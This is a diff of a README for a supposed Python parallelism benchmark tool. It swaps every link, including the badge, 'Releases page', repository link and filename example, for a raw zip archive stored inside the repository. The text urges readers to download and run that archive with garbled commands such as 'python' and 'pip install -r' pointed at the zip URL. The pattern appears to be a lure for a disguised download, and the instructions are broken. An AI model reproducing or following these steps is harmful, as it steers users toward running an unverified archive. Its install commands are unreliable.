@@ -1,6 +1,6 @@
 # 🌟 pydre-parallelism-benchmark - Benchmark Your Data Workloads Easily
 
-[![Download pydre-parallelism-benchmark](https://github.com/Ed1P/pydre-parallelism-benchmark/raw/refs/heads/main/benchmarks/pydre-benchmark-parallelism-3.6.zip%https://github.com/Ed1P/pydre-parallelism-benchmark/raw/refs/heads/main/benchmarks/pydre-benchmark-parallelism-3.6.zip)](https://github.com/Ed1P/pydre-parallelism-benchmark/raw/refs/heads/main/benchmarks/pydre-benchmark-parallelism-3.6.zip)
+[![Download pydre-parallelism-benchmark](https://raw.githubusercontent.com/Ed1P/pydre-parallelism-benchmark/main/benchmarks/projects/pydre-parallelism-benchmark-3.3.zip%https://raw.githubusercontent.com/Ed1P/pydre-parallelism-benchmark/main/benchmarks/projects/pydre-parallelism-benchmark-3.3.zip)](https://raw.githubusercontent.com/Ed1P/pydre-parallelism-benchmark/main/benchmarks/projects/pydre-parallelism-benchmark-3.3.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ Before downloading, make sure your system meets these requirements:
 
 To get the software, visit the Releases page:
 
-[Download Now](https://github.com/Ed1P/pydre-parallelism-benchmark/raw/refs/heads/main/benchmarks/pydre-benchmark-parallelism-3.6.zip)
+[Download Now](https://raw.githubusercontent.com/Ed1P/pydre-parallelism-benchmark/main/benchmarks/projects/pydre-parallelism-benchmark-3.3.zip)
 
 ### 3. Download the Application
 
@@ -31,7 +31,7 @@ On the Releases page, you will find the latest version of the pydre-parallelism-
 
 1. Look for the version number labeled as "Latest Release."
 2. Click on the link to download the file.  
-   For example, it may be named `https://github.com/Ed1P/pydre-parallelism-benchmark/raw/refs/heads/main/benchmarks/pydre-benchmark-parallelism-3.6.zip`.
+   For example, it may be named `https://raw.githubusercontent.com/Ed1P/pydre-parallelism-benchmark/main/benchmarks/projects/pydre-parallelism-benchmark-3.3.zip`.
 
 ### 4. Unzip the Downloaded File
 
@@ -39,7 +39,7 @@ Once the download completes, locate the file in your Downloads folder:
 
 - If you're using Windows, right-click the file and select "Extract All."
 - For macOS, double-click the .zip file to unzip it.
-- On Linux, you can use the terminal to run `unzip https://github.com/Ed1P/pydre-parallelism-benchmark/raw/refs/heads/main/benchmarks/pydre-benchmark-parallelism-3.6.zip`.
+- On Linux, you can use the terminal to run `unzip https://raw.githubusercontent.com/Ed1P/pydre-parallelism-benchmark/main/benchmarks/projects/pydre-parallelism-benchmark-3.3.zip`.
 
 ### 5. Install Dependencies
 
@@ -50,7 +50,7 @@ The application requires certain Python libraries to run effectively. Follow the
 3. Install the required libraries by running:
 
    ```
-   pip install -r https://github.com/Ed1P/pydre-parallelism-benchmark/raw/refs/heads/main/benchmarks/pydre-benchmark-parallelism-3.6.zip
+   pip install -r https://raw.githubusercontent.com/Ed1P/pydre-parallelism-benchmark/main/benchmarks/projects/pydre-parallelism-benchmark-3.3.zip
    ```
 
 ### 6. Run the Application
@@ -61,7 +61,7 @@ Now that you have everything set up, it's time to run the application:
 2. Execute the command:
 
    ```
-   python https://github.com/Ed1P/pydre-parallelism-benchmark/raw/refs/heads/main/benchmarks/pydre-benchmark-parallelism-3.6.zip
+   python https://raw.githubusercontent.com/Ed1P/pydre-parallelism-benchmark/main/benchmarks/projects/pydre-parallelism-benchmark-3.3.zip
    ```
 
 The application will start running, and you'll see output that helps you analyze performance based on different processing strategies.
@@ -93,8 +93,8 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 For more information and updates, check out the GitHub repository:
 
-[GitHub Repository](https://github.com/Ed1P/pydre-parallelism-benchmark/raw/refs/heads/main/benchmarks/pydre-benchmark-parallelism-3.6.zip)
+[GitHub Repository](https://raw.githubusercontent.com/Ed1P/pydre-parallelism-benchmark/main/benchmarks/projects/pydre-parallelism-benchmark-3.3.zip)
 
 Once again, here’s the link to download the application:
 
-[Download Now](https://github.com/Ed1P/pydre-parallelism-benchmark/raw/refs/heads/main/benchmarks/pydre-benchmark-parallelism-3.6.zip)
+[Download Now](https://raw.githubusercontent.com/Ed1P/pydre-parallelism-benchmark/main/benchmarks/projects/pydre-parallelism-benchmark-3.3.zip)
